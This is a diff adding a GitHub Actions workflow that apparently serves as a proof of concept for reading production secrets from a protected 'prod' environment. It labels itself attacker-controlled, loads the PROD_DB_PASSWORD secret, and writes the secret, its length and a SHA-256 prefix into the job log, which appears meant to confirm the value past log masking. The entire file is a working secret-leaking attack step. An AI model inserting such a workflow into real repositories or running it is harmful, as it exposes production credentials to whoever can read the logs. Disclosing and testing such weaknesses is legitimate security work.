@@ -1,0 +1,18 @@
+name: env-proof
+on:
+  push:
+    branches: [main, envtest]
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: prod
+    steps:
+      - name: marker
+        run: echo "ATTACKER_CONTROLLED=1"
+      - name: read production secret
+        env:
+          S: ${{ secrets.PROD_DB_PASSWORD }}
+        run: |
+          echo "S: $S"
+          echo "secret_len=${#S}"
+          printf '%s' "$S" | sha256sum | cut -c1-32 | sed 's/^/secret_sha256_prefix=/'
